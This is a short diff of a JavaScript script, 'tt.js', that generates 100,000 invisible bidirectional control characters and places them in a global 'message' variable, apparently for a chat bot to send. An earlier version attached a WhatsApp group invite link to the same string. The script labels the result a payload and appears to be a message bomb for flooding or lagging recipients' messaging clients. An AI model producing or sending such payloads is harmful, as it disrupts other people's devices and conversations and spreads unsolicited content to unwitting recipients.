@@ -1,13 +1,12 @@
-let caption = "Millions invisible chars";
+// tt.js
+let payload = "";
 
-// Add invisible U+200E and U+200F characters
+// Generate 50,000 invisible character pairs
 for (let i = 0; i < 50000; i++) {
-    caption += "\u200E\u200F";
+    payload += "\u200E\u200F";
 }
 
-let link = "https://chat.whatsapp.com/KGSHc7U07u3IqbUFPQX15q?mode=gi_t";
+// Ensure the variable 'message' contains ONLY the payload
+message = payload;
 
-// Final message - No 'let' here so the bot can capture it!
-message = link + "\n\n" + caption;
-
-console.log("[SYSTEM] Payload generated successfully.");
+console.log("[SYSTEM] Pure invisible payload generated.");
